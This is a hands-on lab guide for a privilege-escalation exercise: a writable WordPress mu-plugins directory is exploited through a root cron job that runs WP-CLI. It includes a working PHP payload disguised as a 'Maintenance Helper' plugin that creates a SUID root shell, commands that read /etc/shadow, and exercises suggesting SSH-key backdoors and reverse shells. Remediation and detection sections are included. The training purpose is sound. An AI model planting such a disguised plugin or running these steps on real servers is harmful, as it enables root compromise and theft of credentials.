# LAB: WordPress Mu-Plugin Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Web Agency Maintenance System

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user with web shell access (`www-data`). Your goal is to escalate to root.

**Background:**
The IT department has deployed a WordPress site and created automated maintenance scripts that run as root using WP-CLI. This is common in agencies managing multiple WordPress sites where updates need to be automated.

**Your access:**
- Shell access as `www-data` (the web server user)
- Write access to WordPress directories (typical for web user)
- No sudo privileges
- No kernel exploits available

**Your mission:**
Escalate from `www-data` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand WordPress mu-plugins and their auto-loading behavior
2. Identify dangerous cron jobs that execute PHP as root
3. Exploit WP-CLI maintenance scripts via mu-plugin injection
4. Achieve root access from a web user
5. Articulate the configuration failures that enabled the attack

---

## PHASE 0 — Environment Setup (Instructor Only)

### Install prerequisites

```bash
# Install PHP CLI (required for WP-CLI)
apt-get update && apt-get install -y php-cli php-mysql curl

# Install WP-CLI
curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
mv wp-cli.phar /usr/local/bin/wp
```

### Create the WordPress structure (simulated)

```bash
# Create WordPress directory structure
mkdir -p /var/www/html/wp-content/mu-plugins
mkdir -p /var/www/html/wp-content/plugins
mkdir -p /var/www/html/wp-content/themes

# Set ownership (www-data owns web files)
chown -R www-data:www-data /var/www/html

# Create a minimal wp-config.php (simulated)
cat > /var/www/html/wp-config.php << 'EOF'
<?php
// Simulated WordPress config for lab purposes
define('ABSPATH', '/var/www/html/');
define('WP_CONTENT_DIR', '/var/www/html/wp-content');
EOF

chown www-data:www-data /var/www/html/wp-config.php
```

### Create the maintenance script (run by root)

```bash
cat > /usr/local/bin/wp-maintenance.sh << 'EOF'
#!/bin/bash
# WordPress Maintenance Script
# Deployed by IT Operations - Do not modify
# Ticket: ITOPS-7823
#
# This script performs automated WordPress maintenance tasks
# including plugin updates, database optimization, and cache clearing

WP_PATH="/var/www/html"
LOG_FILE="/var/log/wp-maintenance.log"

echo "[$(date)] Starting WordPress maintenance" >> "$LOG_FILE"

# Run WP-CLI commands (this loads all mu-plugins!)
cd "$WP_PATH"

# Check WordPress status
/usr/local/bin/wp core version --path="$WP_PATH" 2>> "$LOG_FILE"

# Update plugins
/usr/local/bin/wp plugin update --all --path="$WP_PATH" 2>> "$LOG_FILE" || true

# Clear cache
/usr/local/bin/wp cache flush --path="$WP_PATH" 2>> "$LOG_FILE" || true

echo "[$(date)] Maintenance complete" >> "$LOG_FILE"
EOF

chmod 755 /usr/local/bin/wp-maintenance.sh
chown root:root /usr/local/bin/wp-maintenance.sh

# Create log file
touch /var/log/wp-maintenance.log
chmod 644 /var/log/wp-maintenance.log
```

### Schedule the cron job (runs as root)

```bash
echo "*/5 * * * * root /usr/local/bin/wp-maintenance.sh" > /etc/cron.d/wp-maintenance
chmod 644 /etc/cron.d/wp-maintenance
```

### Verify www-data user exists

```bash
# www-data should already exist (created by apache2/nginx)
# If not, create it:
id www-data || useradd -r -s /usr/sbin/nologin www-data
```

**Setup complete.** The environment now mimics a real WordPress server with automated maintenance.

---

## PHASE 1 — Initial Access & Reconnaissance

### Simulate web shell access (as www-data)

```bash
# Switch to www-data user
su -s /bin/bash www-data
```

### Verify your (lack of) privileges

```bash
id
```

**Expected:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
sudo -l
```

**Expected:**
```
Sorry, user www-data may not run sudo on this host.
```

✅ You are a web user with no sudo access.

---

## PHASE 2 — Enumeration

### Pedagogical purpose
> Real attackers enumerate the environment before exploiting. Understanding WordPress structure is key.

### Check what you can write to

```bash
find /var/www -type d -writable 2>/dev/null
```

**Interesting finding:**
```
/var/www/html/wp-content/mu-plugins
/var/www/html/wp-content/plugins
/var/www/html/wp-content/uploads
```

### Understand mu-plugins

```bash
ls -la /var/www/html/wp-content/mu-plugins/
```

**Key insight:** The `mu-plugins` directory is writable and **mu-plugins auto-load on every WordPress request**.

### Look for scheduled tasks

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/local/bin/wp-maintenance.sh
```

**Critical finding:** Root runs WordPress maintenance every 5 minutes.

### Examine the maintenance script

```bash
cat /usr/local/bin/wp-maintenance.sh
```

**Key observations:**
- Script runs as root
- Uses WP-CLI (`/usr/local/bin/wp`)
- Points to `/var/www/html` (our writable WordPress)

### What is WP-CLI?

WP-CLI is a command-line interface for WordPress. When it runs commands like `wp plugin update`, it:
1. Bootstraps WordPress
2. Loads wp-config.php
3. **Loads ALL mu-plugins automatically**
4. Executes the requested command

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the maintenance script? → No (owned by root, mode 755)
2. Can I influence what WordPress code runs? → **Yes** (mu-plugins directory is writable)
3. Does root execute WordPress code? → **Yes** (via WP-CLI)
4. Are mu-plugins loaded automatically? → **Yes** (no activation required)

**This is a mu-plugin injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How mu-plugins work

WordPress "must-use plugins" (mu-plugins) are:
- Located in `wp-content/mu-plugins/`
- **Automatically loaded on every WordPress execution**
- Cannot be disabled from the admin panel
- Run before regular plugins

### What happens when WP-CLI runs

```
root executes: wp plugin update --all
    │
    ├── WP-CLI bootstraps WordPress
    ├── WordPress loads wp-config.php
    ├── WordPress auto-loads ALL files in mu-plugins/
    │     └── YOUR MALICIOUS PHP CODE RUNS AS ROOT
    └── WP-CLI executes the plugin update command
```

### The attack chain

1. Attacker creates malicious PHP in `/var/www/html/wp-content/mu-plugins/`
2. Root cron job runs WP-CLI
3. WP-CLI loads WordPress, which loads all mu-plugins
4. Malicious PHP executes as root
5. Root shell is created

---

## PHASE 4 — Exploitation

### Create the payload

This PHP file will be executed by root when WP-CLI runs:

```bash
cat > /var/www/html/wp-content/mu-plugins/maintenance-helper.php << 'EOF'
<?php
/**
 * Plugin Name: Maintenance Helper
 * Description: Assists with maintenance tasks
 * Version: 1.0
 */

// Only execute payload once
$marker = '/tmp/.wp-maintenance-done';
if (!file_exists($marker)) {
    // Create SUID root shell
    copy('/bin/bash', '/tmp/rootbash');
    chmod('/tmp/rootbash', 04755);

    // Leave evidence for verification
    file_put_contents('/tmp/pwned.txt', 'Pwned at ' . date('Y-m-d H:i:s'));

    // Create marker to prevent re-execution
    touch($marker);
}
EOF
```

### Verify payload is staged

```bash
ls -la /var/www/html/wp-content/mu-plugins/
```

**Expected:**
```
-rw-r--r-- 1 www-data www-data  ... maintenance-helper.php
```

### What will happen when cron runs

1. Root executes `/usr/local/bin/wp-maintenance.sh`
2. Script runs `wp plugin update --all`
3. WP-CLI loads WordPress → loads mu-plugins
4. `maintenance-helper.php` executes as root
5. SUID shell created at `/tmp/rootbash`

---

## PHASE 5 — Wait for Execution (or Trigger Manually)

### Option A: Wait for cron

The job runs every 5 minutes. Wait and monitor:

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
# Run as root to simulate cron
sudo /usr/local/bin/wp-maintenance.sh
```

### Verify the payload executed

```bash
ls -la /tmp/rootbash
```

**Expected:**
```
-rwsr-xr-x 1 root root 1234567 ... /tmp/rootbash
```

The `s` in `-rwsr-xr-x` indicates the SUID bit.

```bash
cat /tmp/pwned.txt
```

**Expected:**
```
Pwned at [timestamp]
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

The `-p` flag tells bash to preserve the effective UID.

### Verify root access

```bash
id
```

**Expected:**
```
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Demonstrate root capabilities

```bash
whoami
```
→ `root`

```bash
cat /etc/shadow | head -3
```
→ Shows password hashes (only readable by root)

```bash
touch /root/pwned_by_www-data
ls -la /root/pwned_by_www-data
```
→ File created in /root

### Exit the root shell

```bash
exit
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
www-data (uid=33)
    │
    ├── Enumerated writable WordPress directories
    ├── Found mu-plugins directory
    ├── Discovered root cron job running WP-CLI
    │
    ▼
Created malicious mu-plugin
    │
    ├── maintenance-helper.php
    ├── Contains PHP code to create SUID shell
    │
    ▼
Root cron executed WP-CLI
    │
    ├── WP-CLI loaded WordPress
    ├── WordPress auto-loaded mu-plugins
    ├── Malicious PHP executed as root
    ├── SUID bash created at /tmp/rootbash
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Design** | Running WP-CLI as root loads untrusted code |
| **Permissions** | mu-plugins directory writable by www-data |
| **Least Privilege** | Maintenance runs as root instead of www-data |

### The one-sentence summary

> **Root executed WP-CLI which auto-loaded attacker-controlled PHP code.**

---

## REMEDIATION

### Fix 1: Run WP-CLI as the web user, not root

```bash
# Change cron to run as www-data
*/5 * * * * www-data /usr/local/bin/wp-maintenance.sh
```

### Fix 2: Protect mu-plugins directory

```bash
# Make mu-plugins owned by root, not writable by www-data
chown root:root /var/www/html/wp-content/mu-plugins
chmod 755 /var/www/html/wp-content/mu-plugins
```

### Fix 3: Use a dedicated maintenance user

```bash
# Create dedicated user
useradd -r -s /usr/sbin/nologin wpmaint

# Give read access to WordPress but not write to mu-plugins
chown wpmaint:www-data /var/www/html/wp-content/mu-plugins
chmod 755 /var/www/html/wp-content/mu-plugins

# Run maintenance as wpmaint
*/5 * * * * wpmaint /usr/local/bin/wp-maintenance.sh
```

### Fix 4: Use --skip-plugins flag

```bash
# In the maintenance script, skip loading plugins when possible
wp core version --skip-plugins --skip-themes
```

### Fix 5: Integrity monitoring

```bash
# Monitor mu-plugins for unauthorized changes
# Add to monitoring system (AIDE, OSSEC, etc.)
/var/www/html/wp-content/mu-plugins
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| **MITRE ATT&CK** | T1053.003: Scheduled Task/Job: Cron |
| **OWASP** | A03:2021 Injection |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **WordPress hosting panels** — Automated update systems running as root
2. **CI/CD pipelines** — Build systems executing untrusted code
3. **CMS maintenance** — Any CMS with plugin auto-loading and root execution
4. **PHP-FPM misconfigurations** — Pools running as root
5. **Composer scripts** — Post-install scripts in PHP packages

---

## CLEANUP (Instructor)

```bash
# Remove exploitation artifacts
rm -f /tmp/rootbash
rm -f /tmp/pwned.txt
rm -f /tmp/.wp-maintenance-done
rm -f /root/pwned_by_www-data

# Remove malicious mu-plugin
rm -f /var/www/html/wp-content/mu-plugins/maintenance-helper.php

# Remove cron job
rm -f /etc/cron.d/wp-maintenance

# Remove maintenance script
rm -f /usr/local/bin/wp-maintenance.sh

# Remove WordPress simulation
rm -rf /var/www/html
```

---

## STUDENT EXERCISES

### Exercise 1: Alternative Payloads

Instead of creating a SUID shell, write a mu-plugin that:
- Adds your SSH key to /root/.ssh/authorized_keys
- Creates a new admin user in WordPress AND the system
- Establishes a reverse shell

### Exercise 2: Detection

As a defender, how would you detect this attack?
- File integrity monitoring on mu-plugins
- Audit logs for file creation by www-data
- Monitor for unexpected SUID binaries

### Exercise 3: Legitimate Mu-Plugins

Research legitimate uses of mu-plugins. How can you distinguish malicious from legitimate?

### Exercise 4: WP-CLI Security

Review WP-CLI documentation. What security considerations does it mention?
